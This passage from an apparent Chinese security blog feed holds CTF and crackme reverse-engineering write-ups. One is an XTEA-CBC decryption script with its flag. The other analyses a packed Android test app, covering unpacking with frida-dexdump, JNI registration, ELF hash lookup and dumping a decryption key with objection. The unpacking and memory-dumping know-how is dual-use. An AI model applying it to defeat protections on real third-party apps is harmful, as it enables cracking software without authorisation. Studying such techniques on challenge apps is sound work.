src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518165628516.png" alt="image-20250518165628516"></p><p>然后ai写的脚本</p><pre><code class="language-python">import structdef xtea_decrypt_block(cipher_block, key):    &quot;&quot;&quot;    XTEA解密单块(8字节)    :param cipher_block: bytes类型密文块(8字节)    :param key: bytes类型密钥(16字节)    :return: 解密后的中间块(8字节)    &quot;&quot;&quot;    # 将输入转换为数值    v5, v4 = struct.unpack(&#39;&lt;2I&#39;, cipher_block)  # 小端序    key = struct.unpack(&#39;&lt;4I&#39;, key)  # 密钥转换为4个32位整数    # 预生成加密时的sum轨迹    sum_values = []    current_sum = 0    for i in range(32):        sum_values.append(current_sum)        key_idx = i % 4        current_sum += (key[key_idx] ^ i) - 0x61C88647    # 逆序解密处理    for i in reversed(range(32)):        # 获取当前轮的sum状态        sum_after = sum_values[i + 1] if i &lt; 31 else current_sum  # 最后一轮的sum        # 逆向处理v4的更新        key_idx = (sum_after &gt;&gt; 11) &amp; 3        key_val = key[key_idx]        v4 -= (((v5 &lt;&lt; 4) ^ (v5 &gt;&gt; 5)) + v5) ^ (sum_after + key_val)        v4 &amp;= 0xFFFFFFFF        # 逆向处理v5的更新        sum_before = sum_values[i]        key_idx = sum_before &amp; 3        key_val = key[key_idx]        v5 -= (((v4 &lt;&lt; 4) ^ (v4 &gt;&gt; 5)) + v4) ^ (sum_before + key_val)        v5 &amp;= 0xFFFFFFFF    return struct.pack(&#39;&lt;2I&#39;, v5, v4)def cbc_decrypt(ciphertext, key, iv):    &quot;&quot;&quot;    CBC模式解密主函数    :param ciphertext: bytes类型完整密文    :param key: bytes类型密钥(16字节)    :param iv: bytes类型初始向量(8字节)    :return: bytes类型明文    &quot;&quot;&quot;    # 参数校验    if len(key) != 16:        raise ValueError(&quot;密钥必须为16字节&quot;)    if len(iv) != 8:        raise ValueError(&quot;IV必须为8字节&quot;)    if len(ciphertext) % 8 != 0:        raise ValueError(&quot;密文长度必须是8的倍数&quot;)    # 分块处理    blocks = [ciphertext[i:i + 8] for i in range(0, len(ciphertext), 8)]    prev_cipher = iv    plaintext = bytearray()    for block in blocks:        # 解密当前块        decrypted = xtea_decrypt_block(block, key)        # CBC异或操作        plain_block = bytes([d ^ p for d, p in zip(decrypted, prev_cipher)])        plaintext.extend(plain_block)        # 更新前一个密文块        prev_cipher = block    return bytes(plaintext)# ------------------- 使用示例 -------------------if __name__ == &quot;__main__&quot;:    # 示例数据（需替换为实际值）    encrypted_data = bytes.fromhex(&quot;A90B5C1CA34188CA66D9771D78038E7ABA7BD490CD500783414A829C791DCC6F9D2F392DA2DA831B&quot;)    secret_key = bytes.fromhex(&quot;52756e74696d65537472696e67457874&quot;)    initialization_vector = bytes.fromhex(&quot;4c696e4b48405348&quot;)    try:        # 执行解密        decrypted = cbc_decrypt(encrypted_data, secret_key, initialization_vector)        print(f&quot;解密结果(HEX): &#123;decrypted.hex()&#125;&quot;)        print(f&quot;ASCII表示: &#123;decrypted.decode(&#39;utf-8&#39;, errors=&#39;replace&#39;)&#125;&quot;)    except Exception as e:        print(f&quot;解密失败: &#123;str(e)&#125;&quot;)</code></pre><p><strong>palu{thiS_T1Me_it_seeM5_tO_8e_ReAl_te@}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次APK分析</title>
      <link href="/2025/05/07/%E8%AE%B0%E4%B8%80%E6%AC%A1APK%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/07/%E8%AE%B0%E4%B8%80%E6%AC%A1APK%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次APK分析"><a href="#记一次APK分析" class="headerlink" title="记一次APK分析"></a>记一次APK分析</h1><h3 id="一、Java层分析"><a href="#一、Java层分析" class="headerlink" title="一、Java层分析"></a>一、Java层分析</h3><p>先jadx打开看看Java层，结果发现有壳<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250507204842110.png" alt="image-20250507204842110"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250507205928027.png" alt="image-20250507205928027"></p><p>360壳，直接用frida-dexdump一把梭<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529164901099.png" alt="image-20250529164901099"></p><p>脱完壳之后直接分析class.dex，如果jadx反编译报错说checksum有问题的话，这样操作<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529171135892.png" alt="image-20250529171135892"></p><p>把这个关了就好了，就可以正常反编译了</p><p>接下来就直接分析<strong>com.kanxue.test.MainActivity</strong></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529171556152.png" alt="image-20250529171556152"></p><p>很显然，check逻辑都写在so层了</p><h3 id="二、so层分析"><a href="#二、so层分析" class="headerlink" title="二、so层分析"></a>二、so层分析</h3><h4 id="2-1JNI静态注册与动态注册"><a href="#2-1JNI静态注册与动态注册" class="headerlink" title="2.1JNI静态注册与动态注册"></a>2.1JNI静态注册与动态注册</h4><p>JNI注册方法分为静态注册和动态注册，静态注册的方法可以在IDA的函数窗口或者导出表中直接找到，比较简单。动态注册的方法需要分析<strong>JNI_OnLoad</strong>函数，把libnative-lib.so拖进ida神器，分析Exports导出表，可知上图中的stringFromJNI方法是静态注册，而test方法是动态注册。</p><p>导出表</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529172647435.png" alt="image-20250529172647435"></p><p>函数窗口也可以找到<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529172904955.png" alt="image-20250529172904955"></p><p>查看段<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529172950752.png" alt="image-20250529172950752"></p><p>可以看到也是存在**.init_aray**段，即test方法是动态注册的</p><p>在分析JNI_OnLoad函数之前，先回顾一下JNI方法动态注册的流畅：</p><pre><code class="language-C">//第一步，实现JNI_OnLoad方法JNIEXPORT jint JNI_OnLoad(JavaVM* jvm, void* reserved)&#123;    //第二步，获取JNIEnv    JNIEnv* env = NULL;    if(jvm-&gt;GetEnv((void**)&amp;env, JNI_VERSION_1_6) != JNI_OK)&#123;        return JNI_FALSE;    &#125;    //第三步，获取注册方法所在Java类的引用    jclass clazz = env-&gt;FindClass(&quot;com/NshIdE/MainActivity&quot;);    if (!clazz)&#123;        return JNI_FALSE;    &#125;    //第四步，动态注册native方法    if(env-&gt;RegisterNatives(clazz, gMethods, sizeof(gMethods)/sizeof(gMethods[0])))&#123;        return JNI_FALSE;    &#125;    return JNI_VERSION_1_6;&#125;</code></pre><p>其中第四步gMethods变量是JNINativeMethod结构体，用于映射Java方法与C&#x2F;C++函数的关系，其定义如下:</p><pre><code class="language-c">typedef struct &#123;    const char* name; //动态注册的Java方法名    const char* signature; //描述方法参数和返回值    void*       fnPtr; //指向实现Java方法的C/C++函数指针&#125; JNINativeMethod;</code></pre><h4 id="2-2JNI-OnLoad分析"><a href="#2-2JNI-OnLoad分析" class="headerlink" title="2.2JNI_OnLoad分析"></a>2.2JNI_OnLoad分析</h4><p>ida中找到JNI_OnLoad方法<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529191307869.png" alt="image-20250529191307869"></p><p>这里ida识别出来了第一个参数是JavaVM指针类型，所以就可以不用手动修复了，跟进<strong>sub_9230</strong>函数<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529191603885.png" alt="image-20250529191603885"></p><p>这里就没有识别出来，所以需要手动修复一下，选中int，然后按<strong>快捷键Y</strong>，将int改成JavaVM*</p><p>修复之后如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529191746110.png" alt="image-20250529191746110"></p><p>同时，代码中的结构体也被识别出来了</p><p>然后回到JNI_OnLoad函数中，从JNI动态注册流程可知，<strong>jvm-&gt;GetEnv</strong>的第一个参数是JNIEnv指针类型，对应<strong>sub_9230</strong>函数的伪代码中的<strong>a2</strong>，在<strong>JNI_OnLoad</strong>函数中则对应的是<strong>v4</strong>，手动修复一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529192845439.png" alt="image-20250529192845439"></p><p>那么跟进到sub_9264函数中也是一样，手动修复一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529192947923.png" alt="image-20250529192947923"></p><p>继续分析<strong>sub_928E</strong>函数，这个函数自然就是<strong>env-&gt;RegisterNatives</strong>了，一样手动修复一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529193157263.png" alt="image-20250529193157263"></p><p>最后回到JNI_OnLoad函数，重新按F5重新让ida反编译一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529193309639.png" alt="image-20250529193309639"></p><p>这样就很清晰了。v5指针指向的就是JNINativeMethod结构体，跟进<strong>unk_1C066</strong>查看<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529193939112.png" alt="image-20250529193939112"></p><p>很明显，值被加密了</p><h4 id="2-3-init段分析"><a href="#2-3-init段分析" class="headerlink" title="2.3.init段分析"></a>2.3.init段分析</h4><p>在链接so共享目标文件的时候，如果so中存在.init和.init_array段，则会先执行.init和.init_array段的函数，然后再执行JNI_OnLoad函数。通过静态分析可知，JNI_OnLoad函数中的v5指针指向的地址上的变量值是加密状态，但是在实际运行当中，v5指针指向的地址上的值应该是解密状态，所以解密操作应该在JNI_OnLoad函数运行之前，<strong>.init</strong>或者**.init_array**段上的函数</p><p>还是一样，查看段<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529194414201.png" alt="image-20250529194414201"></p><p>定位.init_array段，发现这里定义了一个解密函数<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529194505308.png" alt="image-20250529194505308"></p><p>跟进分析伪代码</p><pre><code class="language-c">unsigned int datadiv_decode4192348989750430380()&#123;  unsigned int n0x10; // r0  unsigned int n0x1B; // r0  unsigned int n0xA; // r0  unsigned int n0xE; // r0  unsigned int n4; // r0  unsigned int n0x15; // r0  unsigned int n0x1C; // r0  unsigned int n0xD; // r0  int v8; // r0  unsigned int n0xB; // r0  int v10; // r0  unsigned int n0x15_1; // r0  unsigned int n0x1C_1; // r0  unsigned int n0xC; // r0  unsigned int n0x43; // r0  unsigned int n0x43_1; // [sp+0h] [bp-3Ch]  unsigned int n0xC_1; // [sp+4h] [bp-38h]  unsigned int n0x1C_3; // [sp+8h] [bp-34h]  unsigned int n0x15_3; // [sp+Ch] [bp-30h]  int v19; // [sp+10h] [bp-2Ch]  unsigned int n0xB_1; // [sp+14h] [bp-28h]  int v21; // [sp+18h] [bp-24h]  unsigned int n0xD_1; // [sp+1Ch] [bp-20h]  unsigned int n0x1C_2; // [sp+20h] [bp-1Ch]  unsigned int n0x15_2; // [sp+24h] [bp-18h]  unsigned int n4_1; // [sp+28h] [bp-14h]  unsigned int n0xE_1; // [sp+2Ch] [bp-10h]  unsigned int n0xA_1; // [sp+30h] [bp-Ch]  unsigned int n0x1B_1; // [sp+34h] [bp-8h]  unsigned int n0x10_1; // [sp+38h] [bp-4h]  n0x10_1 = 0;  do  &#123;    n0x10 = n0x10_1;    byte_1C010[n0x10_1++] ^= 0x14u;  &#125;  while ( n0x10 &lt; 0x10 );  n0x1B_1 = 0;  do  &#123;    n0x1B = n0x1B_1;    byte_1C030[n0x1B_1++] ^= 0xD3u;  &#125;  while ( n0x1B &lt; 0x1B );  n0xA_1 = 0;  do  &#123;    n0xA = n0xA_1;    byte_1C04C[n0xA_1++] ^= 0x63u;  &#125;  while ( n0xA &lt; 0xA );  n0xE_1 = 0;  do  &#123;    n0xE = n0xE_1;    byte_1C057[n0xE_1++] ^= 0x3Fu;  &#125;  while ( n0xE &lt; 0xE );  n4_1 = 0;  do  &#123;    n4 = n4_1;    byte_1C066[n4_1++] ^= 0xF3u;  &#125;  while ( n4 &lt; 4 );  n0x15_2 = 0;  do  &#123;    n0x15 = n0x15_2;    byte_1C070[n0x15_2++] ^= 0xFAu;  &#125;  while ( n0x15 &lt; 0x15 );  n0x1C_2 = 0;  do  &#123;    n0x1C = n0x1C_2;    aNb[n0x1C_2++] ^= 0x2Du;  &#125;  while ( n0x1C &lt; 0x1C );  n0xD_1 = 0;  do  &#123;    n0xD = n0xD_1;    byte_1C0AD[n0xD_1++] ^= 0xF5u;  &#125;  while ( n0xD &lt; 0xD );  v21 = 0;  do  &#123;    v8 = v21;    byte_1C0BB[v21++] ^= 0xF8u;  &#125;  while ( !v8 );  n0xB_1 = 0;  do  &#123;    n0xB = n0xB_1;    byte_1C0BD[n0xB_1++] ^= 0xE6u;  &#125;  while ( n0xB &lt; 0xB );  v19 = 0;  do  &#123;    v10 = v19;    byte_1C0C9[v19++] ^= 0x66u;  &#125;  while ( !v10 );  n0x15_3 = 0;  do  &#123;    n0x15_1 = n0x15_3;    byte_1C0D0[n0x15_3++] ^= 0x2Du;  &#125;  while ( n0x15_1 &lt; 0x15 );  n0x1C_3 = 0;  do  &#123;    n0x1C_1 = n0x1C_3;    byte_1C0F0[n0x1C_3++] ^= 9u;  &#125;  while ( n0x1C_1 &lt; 0x1C );  n0xC_1 = 0;  do  &#123;    n0xC = n0xC_1;    byte_1C10D[n0xC_1++] ^= 0x9Eu;  &#125;  while ( n0xC &lt; 0xC );  n0x43_1 = 0;  do  &#123;    n0x43 = n0x43_1;    byte_1C120[n0x43_1++] ^= 0xDBu;  &#125;  while ( n0x43 &lt; 0x43 );  return n0x43;&#125;</code></pre><p>就是一个异或，解密一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529200515107.png" alt="image-20250529200515107"></p><p>这些值解出来正好对应Java中的test方法以及其参数和返回值</p><p><strong>JNINativeMethod</strong>结构体的第三个成员指向实现Java方法的C&#x2F;C++函数地址，so文件的.data段一般是保存已经初始化的<strong>全局静态变量</strong>和局部变量，动态注册函数的信息一般存放在**.data.rel.ro.local<strong>段。交叉引用</strong>byte_1C066<strong>或者</strong>byte_1C070<strong>变量，跳转到</strong>.data.rel.ro**段<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529212434637.png" alt="image-20250529212434637"></p><p>可以看到<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529212456603.png" alt="image-20250529212456603"></p><p><strong>off_1A5C8</strong>的值为<strong>byte_1C066</strong>(动态注册的方法名<strong>test</strong>)，<strong>off_1A5CC</strong>的值为<strong>byte_1C070</strong>，那<strong>off_1A5D0</strong>的值<strong>ooxx</strong>一定就是test方法的<strong>注册地址</strong>，正好对应于JNINativeMethod结构体的三个字段。</p><h4 id="2-4函数逻辑分析"><a href="#2-4函数逻辑分析" class="headerlink" title="2.4函数逻辑分析"></a>2.4函数逻辑分析</h4><p>跳转到ooxx函数，看到<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250529212738467.png" alt="image-20250529212738467"></p><p>这里是ida识别错误了，继续跟进**sub_8930()**函数</p><pre><code class="language-c">int sub_8930()&#123;  unsigned int v0; // r0  int v1; // r1  _BYTE *i; // [sp+18h] [bp-40h]  unsigned int v4; // [sp+1Ch] [bp-3Ch]  int v5; // [sp+20h] [bp-38h]  size_t len; // [sp+24h] [bp-34h]  void *addr; // [sp+2Ch] [bp-2Ch]  int v8; // [sp+30h] [bp-28h]  int v9; // [sp+3Ch] [bp-1Ch] BYREF  int v10; // [sp+40h] [bp-18h]  char ooxx_[8]; // [sp+44h] [bp-14h] BYREF  strcpy(ooxx_, &quot;ooxx&quot;);  v8 = sub_8A88();  if ( sub_8B90(v8, ooxx_, &amp;v9) == -1 )  &#123;    sub_8DB8(&amp;unk_1C010);  &#125;  else  &#123;    addr = (void *)((v8 + v9) &amp; 0xFFFFF000);    v0 = v8 + v9 + v10 - (_DWORD)addr;    v1 = (v0 &gt;&gt; 12) + 1;    if ( !(v0 &lt;&lt; 20) )      v1 = v0 &gt;&gt; 12;    len = v1 &lt;&lt; 12;    if ( mprotect(addr, v1 &lt;&lt; 12, 7) )      sub_8DB8(&amp;unk_1C030);    v5 = v8 + v9 + 59;    v4 = v8 + v9 + v10 - 61;    for ( i = (_BYTE *)v5; (unsigned int)i &lt; v4; ++i )      *i ^= byte_1C180[(_DWORD)&amp;i[-v5]];    if ( mprotect(addr, len, 5) )      sub_8DB8(&amp;unk_1C030);    cacheflush(v8 + v9, v8 + v9 + v10, 0);  &#125;  return _stack_chk_guard;&#125;</code></pre><p>从上往下分析，跟进**sub_8A88()**函数</p><pre><code class="language-c">unsigned int sub_8A88()&#123;  FILE *stream; // [sp+18h] [bp-1040h]  __pid_t pid; // [sp+1Ch] [bp-103Ch]  const char *nptr; // [sp+20h] [bp-1038h]  unsigned int v4; // [sp+24h] [bp-1034h]  char s[4096]; // [sp+3Bh] [bp-101Dh] BYREF  char libnative_lib.so_[29]; // [sp+103Bh] [bp-1Dh] BYREF  v4 = 0;  strcpy(libnative_lib.so_, &quot;libnative-lib.so&quot;);  pid = getpid();  sprintf(s, aKf, pid);                          stream = fopen(s, &amp;aKf[14]);                    if ( stream )  &#123;    while ( fgets(s, 4096, stream) )    &#123;      if ( strstr(s, libnative_lib.so_) )      &#123;        nptr = strtok(s, &amp;aKf[28]);                     v4 = strtoul(nptr, 0, 16);        break;      &#125;    &#125;  &#125;  else  &#123;    puts(&amp;aKf[16]);                               &#125;  fclose(stream);  return v4;&#125;</code></pre><p>其中的数据进行解密，我们在之前解密过了，是&#x2F;proc&#x2F;%d&#x2F;maps，分析代码可知，这里就是在获取so文件映射在内存中的基地址。具体分析如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250530082611434.png" alt="image-20250530082611434"></p><p>返回到sub_8930()函数，继续往下分析，跟进sub_8B90()函数，代码以及分析如下，该函数将libnative-lib.so的基地址和字符串ooxx作为参数传入，第三个参数用于保存返回结果。</p><p>这个函数的主要的功能就是<strong>在一个内存中映射的so文件中，利用 ELF 哈希表机制，找到指定函数（符号名）的地址与大小，并返回。</strong><br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250530100718539.png" alt="image-20250530100718539"></p><p>接下来是以可视化方式展现代码逻辑，核心逻辑就是上图中的代码</p><p>先分析第一句代码(第28行)，首先是基地址+28(0x1C)获取程序头表偏移值52(0x34)<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250530100948590.png" alt="image-20250530100948590"></p><p>接着基地址+0x34，拿到程序头表<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250530101103260.png" alt="image-20250530101103260"></p><p>第一个for循环中的***(baseAddr + 0x2C)**是程序头表的数量，相当于程序执行试图中的Segment个数<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250530101503515.png" alt="image-20250530101503515"></p><p>程序头表是一个Elf_Phdr类型的结构数组，定义如下所示</p><pre><code class="language-c">typedef struct&#123;  Elf32_Word    p_type;         /* Segment type */  Elf32_Off     p_offset;       /* Segment file offset */  Elf32_Addr    p_vaddr;        /* Segment virtual address */  Elf32_Addr    p_paddr;        /* Segment physical address */  Elf32_Word    p_filesz;       /* Segment size in file */  Elf32_Word    p_memsz;        /* Segment size in memory */  Elf32_Word    p_flags;        /* Segment flags */  Elf32_Word    p_align;        /* Segment alignment */&#125; Elf32_Phdr;</code></pre><p>该for循环遍历程序头表，如果Elf32_Phdr.p_type为PT_DYNAMIC(2)，则结束循环<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250530101852837.png" alt="image-20250530101852837"></p><p>其实就是找到.dynamic段，该段主要与动态链接的整个过程有关，保存的是与动态链接相关信息，主要用于寻找与动态链接相关的其他节(.dynsym .dynstr .hash等节)。<br>如图所示<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250530102251098.png" alt="image-20250530102251098"></p><p>第43到66行的for循环里面，拿到了.dynsym、.dynstr、.hash等section的地址。.dynamic段的结构体定义如下：</p><pre><code class="language-c">typedef struct &#123;    Elf32_Sword d_tag;   // 动态段标签，标识这一项的类型（如 DT_NEEDED, DT_SYMTAB 等）    union &#123;        Elf32_Word d_val;  // 整数值（用于 DT_FLAGS 等）        Elf32_Addr d_ptr;  // 地址值（用于 DT_STRTAB, DT_SYMTAB 等）    &#125; d_un;&#125; Elf32_Dyn;</code></pre><table><thead><tr><th><code>d_tag</code> 值</th><th>ELF 宏</th><th>从哪里来</th><th>指向段</th></tr></thead><tbody><tr><td><code>6</code></td><td><code>DT_SYMTAB</code></td><td><code>*v11</code></td><td><code>.dynsym</code>（动态符号表）</td></tr><tr><td><code>5</code></td><td><code>DT_STRTAB</code></td><td><code>*v11</code></td><td><code>.dynstr</code>（动态字符串表）</td></tr><tr><td><code>4</code></td><td><code>DT_HASH</code></td><td><code>*v11</code></td><td><code>.hash</code>（哈希表）</td></tr></tbody></table><p>常见的d_tag值</p><table><thead><tr><th>宏定义名</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td><code>DT_NULL</code></td><td>0</td><td>结束标志</td></tr><tr><td><code>DT_NEEDED</code></td><td>1</td><td>所依赖的共享库（字符串偏移）</td></tr><tr><td><code>DT_PLTRELSZ</code></td><td>2</td><td><code>.rel.plt</code> 段大小（或 <code>.rela.plt</code>）</td></tr><tr><td><code>DT_PLTGOT</code></td><td>3</td><td><code>.got.plt</code> 表地址</td></tr><tr><td><code>DT_HASH</code></td><td>4</td><td>符号哈希表地址（老 ELF 哈希）</td></tr><tr><td><code>DT_STRTAB</code></td><td>5</td><td>字符串表地址（通常是 <code>.dynstr</code>）</td></tr><tr><td><code>DT_SYMTAB</code></td><td>6</td><td>符号表地址（通常是 <code>.dynsym</code>）</td></tr><tr><td><code>DT_RELA</code></td><td>7</td><td><code>.rela.dyn</code> 段地址（如使用 RELA）</td></tr><tr><td><code>DT_RELASZ</code></td><td>8</td><td><code>.rela.dyn</code> 段大小</td></tr><tr><td><code>DT_RELAENT</code></td><td>9</td><td><code>.rela</code> 表项大小</td></tr><tr><td><code>DT_STRSZ</code></td><td>10</td><td>字符串表大小</td></tr><tr><td><code>DT_SYMENT</code></td><td>11</td><td>符号表项大小</td></tr><tr><td><code>DT_INIT</code></td><td>12</td><td>初始化函数地址（如 <code>_init</code>）</td></tr><tr><td><code>DT_FINI</code></td><td>13</td><td>析构函数地址（如 <code>_fini</code>）</td></tr><tr><td><code>DT_SONAME</code></td><td>14</td><td><code>DT_STRTAB</code> 中的共享库名偏移</td></tr><tr><td><code>DT_RPATH</code></td><td>15</td><td>链接器搜索路径（已弃用）</td></tr><tr><td><code>DT_FLAGS</code></td><td>30</td><td>标志位（ELF 标准的一些属性）</td></tr></tbody></table><p>.dynsym区节包含了动态链接符号表，符号表定义如下</p><pre><code class="language-c">typedef struct&#123;     Elf32_Word    st_name;   //函数符号在字符串表中的索引 .dynstr_offset + st_name就是函数符号的具体位置    Elf32_Addr    st_value;  //函数代码实现的位置地址    Elf32_Word    st_size;   //函数代码的长度    unsigned char st_info;    unsigned char st_other;    Elf32_Half    st_shndx;&#125; Elf32_Sym;</code></pre><p>第73行获取到hash表，hash表结构组织如下所示</p><pre><code>-------------------------------              nbucket-------------------------------              nchain  -------------------------------              bucket[0]-------------------------------              ...-------------------------------              bucket[nbucket-1]-------------------------------              chain[0]-------------------------------              ...-------------------------------              chain[nchain-1]------------------------------- </code></pre><p>每个元素由Elf32_Word（大小为4个字节）对象组成，然后我们使用010editor看看hash表，这里nbucket&#x3D;0x107，nchain&#x3D;0x1B1，一共有(0x107 + 0x1B1 + 2) * 4 &#x3D; 2792字节大小，如下所示<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602105606273.png" alt="image-20250602105606273"></p><p>第74行使用hash函数（sub_92D6）计算符号的hash值，ELF的哈希函数是公开的，编译运行得到其hash值为0x766f8</p><pre><code class="language-c">#include &lt;stdio.h&gt;int main(void)&#123;    const char *_name = &quot;ooxx&quot;;    const unsigned char *name = (const unsigned char *) _name;    unsigned h = 0, g;    while(*name) &#123;        h = (h &lt;&lt; 4) + *name++;        g = h &amp; 0xf0000000;        h ^= g;        h ^= g &gt;&gt; 24;    &#125;    printf(&quot;%x\n&quot;,h); //0x766f8    return h;&#125;</code></pre><p>第76到85行就是根据hash值与nbucket取模作为bucket链的索引，<strong>bucket[hash % nbucket]<strong>的值作为.dynsym的索引获得动态链接符号表(Elf32_Sym)，从符号表的st_name找到.dynstr中对应的字符串与函数名相比较，若不等，则根据</strong>bucket[hash % nbucket]的值X作为chain链的索引</strong>，chain[X]的值重新获取一个动态链接符号表，拿到字符串索引后获取.dynstr中对应的字符串与函数名相比较，若再不等，继续根据chain[X]的值Y作为chain链的索引，chain[Y]的值重新获取一个动态链接符号表，直到找到或者chain终止为止。代码实现如下</p><pre><code class="language-c">for(i = bucket[funHash % nbucket]; i != 0; i = chain[i])&#123;    if(strcmp(dynstr + (dynsym + i)-&gt;st_name, funcName) == 0)&#123;      flag = 0;      break;    &#125;  &#125; </code></pre><p>看上去还是比较绕，我们在010 Editor里面手动计算一下，函数Hash值在74行代码中已经计算得到0x766F8，nbucket&#x3D;0x107，mod为hash % nbucket &#x3D; 140，因为hash表的前两个元素是nbucket和nchain，每个元素是Elf32_Word类型，大小为4，所以bucket[hash % nbucket]是第(140 + 2) * 4 &#x3D; 568号字节，其值为0x19B</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602110329788.png" alt="image-20250602110329788"></p><p>.dynstr字符串表的offset等于0x1D00<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602110729178.png" alt="image-20250602110729178"></p><p>st_name为索引的字符串位置则等于0x1D00 + 0x1617 &#x3D; 0x3317，对应字符串”_ZTIPn”，与ooxx不等。所以需要计算chain[0x19B]的值。先计算chain的起始位置为(nbucket + 2) * 4，nbucket &#x3D; 0x107，所以chain的起始位置为1060号字节，0x19B十进制为411，那chain链的411索引对应的字节应该是1060 + 411 * 4 &#x3D; 2704号字节，值为0x5D<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602110859034.png" alt="image-20250602110859034"></p><p>对应.dynsym动态链接符号表的位置为0x5D * 16 &#x3D; 1488号字节，st_name &#x3D; 0x214<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602111845384.png" alt="image-20250602111845384"></p><p>对应的字符串地址为0x1D00 + 0x214 &#x3D; 0x1F14，字符串值为”ooxx”，是我们需要查找的符号。结合上图，则可知Elf32_Sym对象的st_value &#x3D; 0x8DC5，st_size &#x3D; 0x248<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602112239104.png" alt="image-20250602112239104"></p><h4 id="2-5函数解密"><a href="#2-5函数解密" class="headerlink" title="2.5函数解密"></a>2.5函数解密</h4><p>上述sub_8B90函数最后返回0，所以在sub_8930函数的第19行if判断结果为false，然后开始执行第23行的else逻辑。具体分析如下</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602115015819.png" alt="image-20250602115015819"></p><p>第26行的v10变量，伪代码中没有对该变量进行赋值，双击v9和v10发现他们在堆栈是连续的，其实对应于sub_8B90函数最后的st_value和st_size赋值给v9指针，所以v10变量就是st_size</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602115447026.png" alt="image-20250602115447026"></p><p>第36行，这里的<code>i</code>表示加(解)密代码的起始地址，通过遍历地址然后解引与byte_1C180数组中的值进行异或运算得到明文，这里的byte_1C180数组就相当于是解密密钥。查看byte_1C180，发现其定义在.bss段</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602115533112.png" alt="image-20250602115533112"></p><p>bss段通常是用来存放程序中未初始化的全局变量的一块内存区域，静态分析的情况下，无法查看其值，比较方便的方法是程序运行起来后，直接将对应内存中的数据dump下来，那就需要知道byte_1C180数组在内存中的起始地址和大小。</p><p>起始地址比较容易计算，等于<strong>libnative-lib.so在内存中的基地址 + 0x1C180</strong>。通过分析第35行的for循环，可知数组的大小就等于<strong>v4-v5</strong>，即(v8 + v9 + v10 - 61) - (v8 + v9 + 59) &#x3D; v10 - 61 - 59 &#x3D; st_size - 61 - 59 &#x3D; 0x248 - 61 - 59 &#x3D; 464。根据上述信息，直接使用objection dump内存，先使用指令</p><pre><code class="language-bash">objection -d -g com.kanxue.test explore</code></pre><p>以调试模式连接到包名为<strong>com.kanxue.test</strong>的应用，注入后进入交互式命令环境，然后使用指令</p><pre><code class="language-bash">memory list modules</code></pre><p>查看libnative-lib.so在内存中的基地址，然后dump出内存数据:<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602141150636.png" alt="image-20250602141150636"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602141232105.png" alt="image-20250602141232105"></p><p>然后010打开dump下来的文件<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602141303737.png" alt="image-20250602141303737"></p><p>结合伪代码逻辑，idapython脚本如下</p><pre><code class="language-python">key = [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 